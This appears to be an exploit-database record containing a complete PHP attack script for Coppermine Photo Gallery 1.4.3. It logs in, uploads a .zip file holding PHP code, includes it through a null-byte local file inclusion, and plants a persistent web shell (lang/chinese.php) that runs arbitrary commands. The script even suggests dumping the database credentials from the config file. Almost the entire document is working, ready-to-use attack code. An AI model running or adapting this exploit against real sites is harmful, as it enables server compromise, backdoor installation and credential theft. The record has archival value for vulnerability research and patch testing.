{
  "id": "1511",
  "title": "Coppermine Photo Gallery 1.4.3 - Remote Command Execution",
  "cve": null,
  "vuln_type": "file_upload",
  "code": "<?php\r\n#  ---cpg_143_incl_xpl.php                              15.38 04/12/2005       #\r\n#                                                                              #\r\n#           Coppermine Photo Gallery <= 1.4.3 remote commands execution        #\r\n#                              coded by rgod                                   #\r\n#                     site: http://retrogod.altervista.org                     #\r\n#                                                                              #\r\n#  -> this works regardless of any php.ini settings, you need a normal user    #\r\n#  account with upload rights in personal albums and at least one album        #\r\n#                                                                              #\r\n#  usage: launch from Apache, fill in requested fields, then go!               #\r\n#                                                                              #\r\n#  Sun-Tzu: \"The direct and the indirect lead on to each other in turn. It is  #\r\n#  like moving in  a circle--you never come to  an end.  Who can  exhaust the  #\r\n#  possibilities of their combination?\"                                        #\r\n\r\n/* a short explaination:  arbitrary local inclusion issue in \"lang\"\r\n   argument in init.inc.php , ex.:\r\n\r\n   http://[target]/[path]/thumbnails.php?lang=../album/userpics/10002/shell.zip%00\r\n   (by a null char, regardless of magic_quotes_gpc settings, because of\r\n   Coppermine magic quotes disable code)\r\n\r\n   we need to upload a malicious .zip file with php code inside in a personal\r\n   album folder (no check on file contempt) and to include it (cycling inside\r\n   folders we will search for it - a subfolder is created in album/userpics/ dir,\r\n   it is numbered like this: 10000 + db userid).\r\n   We don't see any ouput including it, so the .zip file install a backdoor\r\n   called chinese.php inside Coppermine lang/ dir. Modify the .zip file code\r\n   if you need. After first run, if succeeded, you can launch commands manually:\r\n\r\n   http://[target]/[path]/lang/chinese.php?suntzu=netstat%20-ano\r\n\r\n   however script checks if new \"chinese language file\" is already installed\r\n                                                                              */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>**Coppermine Photo Gallery <= 1.4.3 remote cmmnds xctn**\r\n</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<style type=\"text/css\"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:\r\n#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:    #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;\r\ncolor : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\n**Coppermine Photo Gallery <= 1.4.3 remote cmmnds xctn** </p><p class=\"Stile6\">a\r\nscript  by  rgod  at    <a href=\"http://retrogod.altervista.org\"target=\"_blank\">\r\nhttp://retrogod.altervista.org</a></p><table width=\"84%\"><tr><td    width=\"43%\">\r\n<form name=\"form1\" method=\"post\"   action=\"'.$_SERVER[PHP_SELF].'\">    <p><input\r\ntype=\"text\"  name=\"host\"> <span class=\"Stile5\">* target    (ex:www.sitename.com)\r\n</span></p> <p><input type=\"text\" name=\"path\">  <span class=\"Stile5\">* path (ex:\r\n/coppermine/ or just / ) </span></p><p><input type=\"text\" name=\"cmd\">      <span\r\nclass=\"Stile5\">* specify a command (\"cat ./../include/config.inc.php\" to see dat\r\nabase username & password...)</span></p><p><input  type=\"text\" name=\"USER\"><span\r\nclass=\"Stile5\"> a valid USER with upload rights in personal album folder </span>\r\n</p><p> <input  type=\"text\" name=\"PASS\">   <span class=\"Stile5\"> ... and PASSWOR\r\nD, required for STEP 1 and following... </span>  </p>  <p>  <input   type=\"text\"\r\nname=\"port\"><span class=\"Stile5\">specify  a  port other than  80 (default value)\r\n</span></p><p><input type=\"text\" name=\"proxy\"><span class=\"Stile5\">send  exploit\r\nthrough an HTTP proxy (ip:port)</span></p><p> <input type=\"submit\" name=\"Submit\"\r\nvalue=\"go!\"></p></form></td></tr></table></body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $datai=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".htmlentities($headeri[$li+$ki]).\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($datai)==1) {\r\n      echo \"<td>0\".htmlentities($datai).\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".htmlentities($datai).\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".htmlentities($headeri[$li]).\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() //2x speed\r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {echo 'Not a valid proxy...';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n  if ($proxy=='') {\r\n    $result = socket_connect($socket, $host, $port);\r\n  }\r\n  else {\r\n    $parts =explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $html= '';\r\n    socket_write($socket, $packet, strlen($packet));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n    echo nl2br(htmlentities($html));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction refresh()\r\n{\r\nflush();\r\nob_flush();\r\nusleep(5000000000);\r\n}\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid prozy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);echo nl2br(htmlentities($html));\r\n  refresh();\r\n}\r\n\r\n$host=$_POST[host];$path=$_POST[path];\r\n$port=$_POST[port];$cmd=$_POST[cmd];\r\n$USER=$_POST[USER];$PASS=$_POST[PASS];\r\n$proxy=$_POST[proxy];\r\necho \"<span class=\\\"Stile5\\\">\";\r\n\r\nif (($host<>'') and ($path<>'') and ($cmd<>''))\r\n{\r\n               $port=intval(trim($port));\r\n               if ($port=='') {$port=80;}\r\n               if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\n               $host=str_replace(\"\\r\",\"\",$host);$host=str_replace(\"\\n\",\"\",$host);\r\n               $path=str_replace(\"\\r\",\"\",$path);$path=str_replace(\"\\n\",\"\",$path);\r\n               if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n               $cmd=urlencode($cmd);\r\n\r\n               #STEP 0 -> Check if backdoor already installed...\r\n               $packet =\"GET \".$p.\"lang/chinese.php?suntzu=$cmd HTTP/1.1\\r\\n\";\r\n               $packet.=\"Host: $host\\r\\n\";\r\n               $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n               show($packet);\r\n               sendpacketii($packet);\r\n               if (eregi(\"Hi Master!\",$html)) {die(\"chinese.php already installed...<br>\r\n                                                    Exploit succeeded...<br>\"); }\r\n               //if you are here\r\n               if (($USER=='') | ($PASS==''))\r\n                                              {die(\"chinese.php not installed<br>\r\n                                                    we need a username and a password<br>\");}\r\n}\r\n\r\nif (($host<>'') and ($path<>'') and ($cmd<>'') and ($USER<>'') and ($PASS<>''))\r\n{\r\n               #STEP 1 -> Login...\r\n               $data=\"username=\".urlencode($USER).\"&password=\".urlencode($PASS).\"&submitted=Login\";\r\n               $packet =\"POST \".$p.\"login.php?referer=index.php HTTP/1.1\\r\\n\";\r\n               $packet.=\"Referer: http://\".$host.$path.\"login.php?referer=index.php\\r\\n\";\r\n               $packet.=\"Host: $host\\r\\n\";\r\n               $packet.\"Accept-Language: en\\r\\n\";\r\n               $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n               $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n               $packet.=\"Connection: Close\\r\\n\";\r\n               $packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n               $packet.=$data;\r\n               show($packet);\r\n               sendpacketii($packet);\r\n               $temp=explode(\"Set-Cookie: \",$html);\r\n               $temp2=explode(\" \",$temp[1]);\r\n               $COOKIE=$temp2[0];\r\n               $temp2=explode(\" \",$temp[2]);\r\n               $COOKIE.=\" \".str_replace(\";\",\"\",$temp2[0]);\r\n               $COOKIE=str_replace(\"\\r\",\"\",$COOKIE);$COOKIE=str_replace(\"\\n\",\"\",$COOKIE);\r\n               echo \"COOKIE ->\".htmlentities($COOKIE).\"<BR>\";\r\n\r\n               #STEP 2 -> Upload the malicious zip file...\r\n               $data='-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"file_upload_array[]\"; filename=\"c:\\suntzuuuu.zip\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php $sun_tzu=fopen(\"./lang/chinese.php\",\"w\");\r\nfputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time\\\",0);passthru(\\$HTTP_GET_VARS[suntzu]);?>\");\r\nfclose($sun_tzu); chmod(\"./lang/chinese.php\",777);?>\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"file_upload_array[]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"file_upload_array[]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"file_upload_array[]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"file_upload_array[]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"URI_array[]\"\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"URI_array[]\"\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"URI_array[]\"\r\n\r\n\r\n-----------------------------7d613b1d0448\r\nContent-Disposition: form-data; name=\"control\"\r\n\r\nphase_1\r\n-----------------------------7d613b1d0448--\r\n';\r\n\r\n               $packet =\"POST \".$p.\"upload.php HTTP/1.1\\r\\n\";\r\n               $packet.=\"Referer: http://\".$host.$path.\"upload.php\\r\\n\";\r\n               $packet.=\"Accept-Language: en\\r\\n\";\r\n               $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d613b1d0448\\r\\n\";\r\n               $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n               $packet.=\"Host: \".$host.\"\\r\\n\";\r\n               $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n               $packet.=\"Connection: Close\\r\\n\";\r\n               $packet.=\"Cache-Control: no-cache\\r\\n\";\r\n               $packet.=\"Cookie: \".$COOKIE.\"\\r\\n\\r\\n\";\r\n               $packet.=$data;\r\n               show($packet);\r\n               sendpacketii($packet);\r\n               $temp=explode(\"unique_ID\\\" value=\\\"\",$html);\r\n               $temp2=explode(\"\\\"\",$temp[1]);\r\n               $UNIQUE_ID=$temp2[0];\r\n               echo \"UNIQUE ID ->\".htmlentities($UNIQUE_ID).\"<BR>\";\r\n\r\n\r\n               #STEP 3 -> Select an album...\r\n$data='-----------------------------7d6df34d0448\r\nContent-Disposition: form-data; name=\"unique_ID\"\r\n\r\n'.$UNIQUE_ID.'\r\n-----------------------------7d6df34d0448\r\nContent-Disposition: form-data; name=\"control\"\r\n\r\nphase_2\r\n-----------------------------7d6df34d0448--';\r\n\r\n               $packet =\"POST \".$p.\"upload.php HTTP/1.1\\r\\n\";\r\n               $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n               $packet.=\"Referer: http://\".$host.$path.\"upload.php\\r\\n\";\r\n               $packet.=\"Accept-Language: en\\r\\n\";\r\n               $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d6df34d0448\\r\\n\";\r\n               $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n               $packet.=\"Host: $host\\r\\n\";\r\n               $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n               $packet.=\"Connection: Close\\r\\n\";\r\n               $packet.=\"Cache-Control: no-cache\\r\\n\";\r\n               $packet.=\"Cookie: \".$COOKIE.\"\\r\\n\\r\\n\";\r\n               $packet.=$data;\r\n               show($packet);\r\n               sendpacketii($packet);\r\n               show($html);\r\n               $junk=chr(0x0a).chr(0x20).chr(0x20).chr(0x20).chr(0x20).\r\n                     chr(0x20).chr(0x20).chr(0x20).chr(0x20).chr(0x20).\r\n                     chr(0x20).chr(0x20).chr(0x20).chr(0x20).chr(0x20).\r\n                     chr(0x20).chr(0x20);\r\n               $temp=explode(\"* Personal albums\\\">$junk<option value=\\\"\",$html);\r\n               $temp2=explode(\"\\\"\",$temp[1]);\r\n               $option=$temp2[0];\r\n               if (($option=='') or (strlen($option)>2))\r\n               { $option=1;}\r\n               echo \"ALBUM NUMBER ->\".htmlentities($option).\"<BR>\";\r\n\r\n               #STEP 4 -> Insert .zip file in a valid album...\r\n$data='-----------------------------7d628b39d0448\r\nContent-Disposition: form-data; name=\"album\"\r\n\r\n'.$option.'\r\n-----------------------------7d628b39d0448\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\n\r\n-----------------------------7d628b39d0448\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n\r\n-----------------------------7d628b39d0448\r\nContent-Disposition: form-data; name=\"keywords\"\r\n\r\n\r\n-----------------------------7d628b39d0448\r\nContent-Disposition: form-data; name=\"control\"\r\n\r\nphase_2\r\n-----------------------------7d628b39d0448\r\nContent-Disposition: form-data; name=\"unique_ID\"\r\n\r\n'.$UNIQUE_ID.'\r\n-----------------------------7d628b39d0448--\r\n';\r\n               $packet=\"POST \".$p.\"upload.php HTTP/1.1\\r\\n\";\r\n               $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n               $packet.=\"Referer: http://\".$host.$path.\"upload.php\\r\\n\";\r\n               $packet.=\"Accept-Language: en\\r\\n\";\r\n               $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d628b39d0448\\r\\n\";\r\n               $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n               $packet.=\"Host: $host\\r\\n\";\r\n               $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n               $packet.=\"Connection: Close\\r\\n\";\r\n               $packet.=\"Cache-Control: no-cache\\r\\n\";\r\n               $packet.=\"Cookie: \".$COOKIE.\"\\r\\n\\r\\n\";\r\n               $packet.=$data;\r\n               show($packet);\r\n               sendpacketii($packet);\r\n\r\n               #STEP 5 -> Include the evil .zip file and launch commands...\r\n               $anumber=9999;\r\n               for ($i=0; $i<=200; $i++)\r\n               {  $anumber++;\r\n                  $xpl=urlencode(\"../albums/userpics/\".$anumber.\"/suntzuuuu.zip\".chr(0x00));\r\n                  $packet =\"GET \".$p.\"thumbnails.php?lang=$xpl HTTP/1.1\\r\\n\";\r\n                  $packet.=\"Host: $host\\r\\n\";\r\n                  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n                  show($packet);\r\n                  sendpacketii($packet);\r\n\r\n                  $packet =\"GET \".$p.\"lang/chinese.php?suntzu=$cmd HTTP/1.1\\r\\n\";\r\n                  $packet.=\"Host: $host\\r\\n\";\r\n                  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n                  show($packet);\r\n                  sendpacketii($packet);\r\n                  if (eregi(\"Hi Master!\",$html)) {die (\"Exploit succeeded...<br>\r\n                  you have a shell in http://\".htmlentities($host.$path).\"/lang/chinese.php<br>\");}\r\n               }\r\n//if you are here...\r\necho \"Exploit failed...\";\r\n}\r\necho \"</span>\";\r\n?>\r\n\r\n# milw0rm.com [2006-02-17]",
  "url": "https://www.exploit-db.com/exploits/1511"
}